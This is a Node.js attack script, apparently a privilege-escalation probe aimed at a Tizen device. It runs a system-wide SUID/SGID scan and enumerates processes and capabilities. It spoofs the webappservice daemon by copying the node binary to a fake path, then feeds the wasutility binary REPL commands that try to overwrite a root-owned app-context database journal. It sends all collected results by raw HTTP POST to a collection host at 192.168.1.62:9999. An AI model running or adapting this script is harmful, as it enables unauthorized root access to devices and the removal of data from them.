"use strict";

/* p49: root-vector discovery + wasutility parent battery
   1. identity + staged journal md5 + current target state
   2. SUID/SGID scan (every root binary on the box)
   3. webappservice daemon: pid + exe + package bin paths
   4. wasutility battery:
      T-A   node-direct parent, -h            (parent exe = real node path)
      T-A2  node-direct parent, REPL          (marker p49_node_marker + placement attempt)
      T-B   fake parent (node copy whose exe ends
            /org.tizen.webappservice/bin/webappservice), -h
      T-B2  fake parent, REPL                 (marker p49_fake_marker + placement attempt)
      T-C   marker/journal verify after battery
   5. dotnet-launcher: caps (getfattr/ls -Z) + run
   6. wasdb_backup: perms + owner write test
   exfil /p49info
*/

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var SRC = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var R = { ts: new Date().toISOString(), probe: 'p49', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p49info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 4000);
  }
}

// exec a file DIRECTLY (no sh in between) so the caller's node is the direct parent
function runDirect(file, args, input, timeoutMs) {
  try {
    var opt = { timeout: timeoutMs || 10000, maxBuffer: 8 * 1024 * 1024 };
    if (input !== undefined) opt.input = input;
    var r = cp.spawnSync(file, args, opt);
    var out = '';
    if (r.stdout) out += 'OUT: ' + r.stdout.toString();
    if (r.stderr) out += ' ERR: ' + r.stderr.toString();
    out += ' [exit ' + (r.status === null ? 'null' : r.status) + ']';
    if (r.error) out += ' [spawnErr ' + r.error.message + ']';
    return out.substring(0, 8000);
  } catch (e) { return 'ERR ' + e.message; }
}

function main() {
  R.results.identity = run('id 2>&1; echo ---; whoami 2>&1; echo ---; ls -la /usr/bin/wasutility 2>&1', 10000);

  R.results.staged = run('ls -la ' + SRC + ' 2>&1; md5sum ' + SRC + ' 2>&1', 15000);

  R.results.target_now = run('stat ' + DST + ' 2>&1; echo ---MD5; md5sum ' + DST + ' 2>&1; echo ---LIVE; md5sum /opt/dbspace/.app-context.db 2>&1', 15000);

  // 2) SUID / SGID scan
  R.results.suid = run('echo ===SUID===; find / -perm -4000 -type f 2>/dev/null; echo ===SGID===; find / -perm -2000 -type f 2>/dev/null | head -50; echo ===DIRS===; ls -la /usr/bin /bin /usr/sbin /sbin 2>/dev/null | grep -E "^-|s" | grep -E "rws|sws|rws|4000|setuid|setgid" | head -60', 90000);

  // 3) webappservice daemon + package paths
  R.results.daemon = run('echo ===PS===; ps aux 2>/dev/null | grep -iE "webapp|\\bwas\\b" | grep -v grep; echo ===EXES===; for p in /proc/[0-9]*/exe; do readlink "$p" 2>/dev/null; done | sort | uniq -c | sort -rn | head -30; echo ===ORGPKG===; ls -la /org.tizen.webappservice/bin/ 2>&1; echo ---; ls -la /opt/usr/apps/org.tizen.webappservice/bin/ 2>&1; echo ---; ls -la /opt/usr/apps/webappservice/bin/ 2>&1', 40000);

  // node path + fake parent setup
  var nodePath = process.execPath || '';
  R.results.node_path = nodePath + '  size=' + (function () { try { return fs.statSync(nodePath).size; } catch (e) { return 'n/a'; } })();
  R.results.fake_setup = run('mkdir -p /tmp/p49ps/org.tizen.webappservice/bin 2>&1; echo mk=$?; cp -f "' + nodePath + '" /tmp/p49ps/org.tizen.webappservice/bin/webappservice 2>&1; echo cp=$?; ls -la /tmp/p49ps/org.tizen.webappservice/bin/webappservice 2>&1; du -h /tmp/p49ps/org.tizen.webappservice/bin/webappservice 2>&1', 30000);

  var fakeExe = '/tmp/p49ps/org.tizen.webappservice/bin/webappservice';

  // 4) wasutility battery
  // T-A: node-direct parent, -h
  R.results.ta_dashh = runDirect('/usr/bin/wasutility', ['-h'], undefined, 8000);

  // T-A2: node-direct parent, REPL (marker + placement attempt)
  var replA = ['help', '?', 'id', 'whoami', 'touch /tmp/p49_node_marker', 'cp ' + SRC + ' ' + DST, 'md5sum ' + DST, 'ls -la ' + DST, 'quit', 'exit'].join('\n') + '\n';
  R.results.ta_repl = runDirect('/usr/bin/wasutility', [], replA, 18000);

  // T-B: fake parent, -h (inner script so the fake node is the direct parent of wasutility)
  var innerB = "var cp=require('child_process');var r=cp.spawnSync('/usr/bin/wasutility',['-h'],{timeout:8000});var o='';if(r.stdout)o+='OUT: '+r.stdout.toString();if(r.stderr)o+=' ERR: '+r.stderr.toString();o+=' [exit '+(r.status===null?'null':r.status)+']';if(r.error)o+=' [spawnErr '+(r.error.message)+']';console.log(o);\n";
  try { fs.writeFileSync('/tmp/p49_tB.js', innerB); } catch (e) { R.results.tB_write_err = String(e); }
  R.results.tb_dashh = runDirect(fakeExe, ['-e', "require('/tmp/p49_tB.js')"], undefined, 15000);

  // T-B2: fake parent, REPL (marker + placement attempt)
  var replB = ['help', '?', 'id', 'whoami', 'touch /tmp/p49_fake_marker', 'cp ' + SRC + ' ' + DST, 'md5sum ' + DST, 'ls -la ' + DST, 'quit', 'exit'].join('\n') + '\n';
  var innerB2 = "var cp=require('child_process');var r=cp.spawnSync('/usr/bin/wasutility',[],{input:" + JSON.stringify(replB) + ",timeout:15000});var o='';if(r.stdout)o+='OUT: '+r.stdout.toString();if(r.stderr)o+=' ERR: '+r.stderr.toString();o+=' [exit '+(r.status===null?'null':r.status)+']';if(r.error)o+=' [spawnErr '+(r.error.message)+']';console.log(o);\n";
  try { fs.writeFileSync('/tmp/p49_tB2.js', innerB2); } catch (e) { R.results.tB2_write_err = String(e); }
  R.results.tb_repl = runDirect(fakeExe, ['-e', "require('/tmp/p49_tB2.js')"], undefined, 25000);

  // T-C: verify markers + journal after battery
  R.results.repl_effects = run('echo ===MARKERS===; ls -la /tmp/p49_node_marker /tmp/p49_fake_marker 2>&1; echo ===JOURNAL===; md5sum ' + DST + ' 2>&1; stat ' + DST + ' 2>&1; echo ===LIVE===; md5sum /opt/dbspace/.app-context.db 2>&1', 15000);

  // 5) dotnet-launcher caps + behavior
  R.results.dotnet = run('ls -la /usr/bin/dotnet-launcher 2>&1; echo ===CAPS===; getfattr -n security.capability /usr/bin/dotnet-launcher 2>&1; echo ===Z===; ls -Z /usr/bin/dotnet-launcher 2>&1; echo ===LSATTR===; lsattr /usr/bin/dotnet-launcher 2>&1; echo ===RUN===; /usr/bin/dotnet-launcher 2>&1 | head -25; echo "[run exit $?]"', 25000);

  // 6) wasdb_backup perms + write test
  R.results.wasdb = run('ls -la /opt/usr/apps/webappservice/wasdb_backup/ 2>&1; echo ===WRITETEST===; touch /opt/usr/apps/webappservice/wasdb_backup/.p49test 2>&1; echo touch=$?; rm -f /opt/usr/apps/webappservice/wasdb_backup/.p49test 2>/dev/null; echo ===SHARE===; ls -la /opt/share/webappservice/ 2>&1', 15000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
